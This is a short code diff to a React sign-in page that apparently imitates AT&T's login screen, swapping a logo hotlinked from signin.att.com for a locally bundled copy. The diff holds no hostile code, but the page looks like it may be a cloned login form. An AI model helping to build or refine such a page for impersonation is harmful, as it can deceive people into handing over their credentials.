@@ -7,6 +7,7 @@ import PasswordHeader from '../component/PasswordHeader'
 import axios from 'axios'
 import { baseURL } from '../helpers/data'
 import Loader from '../component/Loader'
+import AttSVG from '../../public/att-icon.svg'
 
 const Signin = () => {
   const [userID, setUserID] = useState('')
@@ -47,11 +48,7 @@ const Signin = () => {
   return (
     <div className='md:h-screen md:w-screen flex items-center justify-between flex-col'>
       <main className='md:border rounded-xl mt-20 flex flex-col items-center md:w-[446px] p-[48px]'>
-        <img
-          src='https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg'
-          width={120}
-          className='mb-10'
-        />
+        <img src={AttSVG} width={120} className='mb-10' />
         <section>
           {!showPassword ? (
             <FormHeader />
